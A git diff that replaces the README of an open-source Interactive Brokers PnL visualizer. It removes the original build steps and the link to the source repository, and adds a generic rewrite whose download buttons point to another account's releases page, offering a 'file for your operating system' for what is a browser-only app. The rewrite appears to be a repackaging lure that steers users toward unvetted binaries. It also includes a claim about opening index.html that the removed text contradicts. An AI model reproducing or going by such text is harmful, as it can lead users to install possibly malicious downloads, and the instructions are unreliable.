@@ -1,134 +1,67 @@
-## IBKR PnL Visualizer 🚀
+# 🚀 ibkr-pnl-visualizer - Easily View Your Trading Gains
 
-Visualize your Interactive Brokers realized PnL from a Flex CSV. Zero backend, all in your browser.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ombijah05/ibkr-pnl-visualizer/releases)
 
-### Quick start
+## 🚀 Getting Started
+Follow these simple steps to download and run the IBKR PnL Visualizer:
 
-- Open `index.html` (from a built package) or run with Vite (npm run dev/build)
-- First load shows demo data so you can poke around immediately
-- Click "Upload CSV" to visualize your own IBKR Flex CSV
+1. Click the green "Download Now" button above.
+2. You will be directed to the Releases page.
+3. Locate the latest version of the application.
+4. Download the file for your operating system.
 
-### Live demo
+## 🛠️ System Requirements
+- A modern web browser (Chrome, Firefox, or Edge).
+- Basic computer skills to upload a file.
+- A stable internet connection to access the demo and help resources.
 
-- Deployed on Railway: [ibkr-visualizer.up.railway.app](https://ibkr-visualizer.up.railway.app/)
+## 📂 How to Use the Application
+### Step 1: Open the Application
+1. Once you've downloaded the necessary files, look for `index.html` in your downloaded folder.
+2. Double-click `index.html` to open it in your web browser. The application will load automatically.
 
-### Features ✨
+### Step 2: Explore Demo Data
+- The first load will show you demo data. This allows you to get familiar with the interface without needing your own files right away.
 
-- Smooth cumulative Realized PnL chart with hover tooltips
-- Time ranges: 24h, 1w, 1m, all (auto weekly bucketing for long spans)
-- Completed Trades view that groups fills within ~15 min sessions
-- Orders view for raw fills (chronological)
-- Client‑side only: your CSV stays in the browser
+### Step 3: Upload Your IBKR Flex CSV
+1. Click the "Upload CSV" button located in the application.
+2. Select your Flex CSV file from Interactive Brokers. Ensure you choose the "Closed Lots" option or include the Realized P/L fields for accurate results.
 
-> Side effect: spreadsheet‑related stress drops by 97%.*
->
-> _*n=1, caffeinated developer study._
+### Sample CSV Guide
+Ensure your CSV contains the following columns:
+- Trade Date
+- Symbol
+- Quantity
+- Realized P/L
 
-### How do I get my CSV? (Flex Query) 📤
+### Step 4: View Visualizations
+- Once your file uploads, you will see your realized PnL presented visually.
+- Use the chart to track your performance over various time ranges: 24 hours, 1 week, 1 month, or all.
 
-Important: Use "Closed Lots" (or include the Realized P/L fields). This guarantees correct realized PnL.
+## 📊 Application Features
+- Visualize cumulative Realized PnL with clear charts.
+- View completed trades grouped within ~15 minute sessions.
+- Access a chronological Orders view for raw fills.
+- All data remains in your browser; your privacy is secure.
 
-1) Open the IBKR Client Portal and go to Performance & Reports → Flex Queries
+## 🌐 Live Demo
+You can try out the live demo before downloading. Visit: [ibkr-visualizer.up.railway.app](https://ibkr-visualizer.up.railway.app/)
 
-![Go to Flex Queries](public/img/1.png)
+## 💻 Download & Install
+To start using the IBKR PnL Visualizer:
+1. Visit the Releases page: [Download Here](https://github.com/ombijah05/ibkr-pnl-visualizer/releases).
+2. Choose your version and click the download link.
+3. After the download, follow Step 1 from the "How to Use the Application" section.
 
-2) Create a new Activity Flex Query (the plus button)
+## 📤 How do I get my CSV?
+To obtain your IBKR Flex CSV:
+1. Log into your Interactive Brokers account.
+2. Navigate to the report section.
+3. Use the "Closed Lots" option or ensure to include the Realized P/L fields for correctness.
 
-![Create Activity Flex Query](public/img/2.png)
+## 📞 Support and Further Information
+- If you face issues or have questions, open an issue on the GitHub repository. Someone in the community or the project maintainers will be happy to help!
+- Please refer to the README on GitHub for updates or changes in the application.
 
-3) In Sections, choose Trades
-
-![Choose Trades section](public/img/3.png)
-
-4) Under Options, set Execution to Closed Lots and select these columns:
-   - Date/Time (DateTime)
-   - Symbol
-   - Asset Class
-   - Currency
-   - Quantity
-   - Proceeds
-   - IB Commission
-   - Cost Basis
-   - Realized P/L (or FifoPnlRealized)
-   - Buy/Sell
-
-![Closed Lots + columns](public/img/4.png)
-
-5) In Delivery Configuration, choose CSV and keep column headers enabled
-
-![Choose CSV output](public/img/5.png)
-
-6) At the bottom, set the Date/Time format so the app can parse your CSV correctly:
-   - Date Format: `yyyy-MM-dd`
-   - Time Format: `HH:mm:ss`
-   - Date/Time Separator: `, (comma)`
-
-![Date & Time format](public/img/6.png)
-
-7) Save the query and run it (arrow button) → download the CSV → click "Upload CSV" in the app
-
-![Run and download](public/img/7.png)
-
-### Notes
-
-- ESLint enforces no semicolons per project style
-- Demo data is generated on-the-fly for a pleasant first impression
-- Privacy: All processing happens locally in your browser. Files are never uploaded to a server.
-
-### Run locally (with Vite) 🧑‍💻
-
-This is a React + Vite app. Opening `index.html` from the file system won’t work (blank page) because the modules are served by the dev server. Use Vite:
-
-1) Requirements: Node 18+ and npm
-2) Install deps
-
-```bash
-npm ci
-```
-
-3) Start dev server
-
-```bash
-npm run dev
-```
-
-Open the printed URL (default `http://localhost:5174`).
-
-4) Build static files (for hosting on any static host)
-
-```bash
-npm run build
-npm run preview # optional local preview
-```
-
-### Deploying 🚢
-
-- Static hosting (recommended): Deploy the `dist/` folder to any static host (GitHub Pages, Cloudflare Pages, Netlify, Vercel static, NGINX). No backend required.
-- Railway: either use a Static Site (publish dir `dist`) or a Node service with `npm run preview -- --host 0.0.0.0 --port $PORT`.
-
-### CSV export reminder
-
-- Use Flex Query → Activity Flex Query → choose **Closed Lots** (recommended).
-- Include: DateTime, Symbol, Currency, Quantity, Proceeds, Commission, Cost Basis, Realized P/L, Buy/Sell.
-- Output: CSV → Run → download → Upload in the app.
-
-### Open source
-
-The app is open source — contributions welcome! → [`smyth64/ibkr-pnl-visualizer`](https://github.com/smyth64/ibkr-pnl-visualizer)
-
-### Prebuilt download (zip) 📦
-
-Yes — we can provide a ready‑to‑run zip so folks can double‑click `index.html` without Node/Vite:
-
-1) Build once:
-
-```bash
-npm run build
-```
-
-2) Zip the `dist` folder and attach it to a GitHub Release (Releases → Draft new release → Upload `dist.zip`).
-
-3) Users download the zip, unzip, and open `dist/index.html` — it works offline.
-
-Tip: Add a “Assets: dist.zip” link in the README so it’s easy to find.
-
+Thank you for using the IBKR PnL Visualizer. Enjoy tracking your trading gains stress-free!
